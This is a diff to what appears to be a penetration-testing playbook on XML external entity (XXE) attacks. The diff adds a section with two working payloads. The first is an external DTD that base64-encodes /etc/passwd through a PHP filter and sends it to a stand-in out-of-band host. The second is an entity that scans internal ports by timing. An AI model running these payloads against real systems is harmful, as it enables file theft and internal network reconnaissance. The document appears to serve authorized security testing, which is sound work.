@@ -44,3 +44,28 @@ A callback carrying the file content (or just a DNS/HTTP hit) proves blind XXE.
 ## Safety
 Prefer `/etc/hostname` over `/etc/passwd` for proof; never entity-expansion DoS; never read secrets
 you don't need. External file read + SSRF-via-XXE are approval-gated.
+
+---
+## 0daysec enrichment (adapted from the user's XXE notes)
+
+### Blind file read of "unprintable" files — php://filter base64 (KEY technique)
+Files with `&`, `<`, newlines, or binary bytes break a naive SYSTEM entity / exfil URL. Wrap the read
+in a PHP base64 filter so the content is URL-safe base64 before it leaves — this is what makes blind
+exfil of `/etc/passwd`, config files, source, etc. actually work (PHP targets).
+`x.dtd` (external DTD on your OOB host):
+```
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TOKEN.oob.example/?d=%file;'>">
+%eval; %exfil;
+```
+The callback carries base64; decode offline. Also reads PHP source (`...resource=index.php`) without it
+executing.
+
+### Time-based internal port scan via XXE (no OOB needed)
+Point a SYSTEM entity at an internal `host:port`; infer state from parse delay:
+```xml
+<!DOCTYPE r [ <!ENTITY f SYSTEM "http://INTERNAL_IP:PORT/"> ]>
+<root>&f;</root>
+```
+Fast error = closed/refused; hang-then-timeout = filtered; quick body/variant = open. Hand confirmed
+internal reachability to `ssrf-*`; keep probes rate-limited and in-scope.
